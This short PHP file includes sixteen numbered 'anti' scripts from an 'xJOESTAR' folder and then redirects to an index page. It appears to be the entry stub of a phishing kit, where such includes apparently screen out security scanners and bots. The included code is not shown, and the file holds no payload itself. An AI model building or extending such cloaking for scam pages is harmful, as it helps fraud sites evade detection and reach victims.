<?php
  	include '../../xJOESTAR/anti1.php';
    include '../../xJOESTAR/anti2.php';
    include '../../xJOESTAR/anti3.php';
    include '../../xJOESTAR/anti4.php';
    include '../../xJOESTAR/anti5.php';
    include '../../xJOESTAR/anti6.php';
    include '../../xJOESTAR/anti7.php';
    include '../../xJOESTAR/anti8.php';
	include '../../xJOESTAR/anti9.php';
    include '../../xJOESTAR/anti10.php';
    include '../../xJOESTAR/anti11.php';
    include '../../xJOESTAR/anti12.php';
    include '../../xJOESTAR/anti13.php';
    include '../../xJOESTAR/anti14.php';
    include '../../xJOESTAR/anti15.php';
    include '../../xJOESTAR/anti16.php';
	exit(header("Location: ../index.php"));
?>
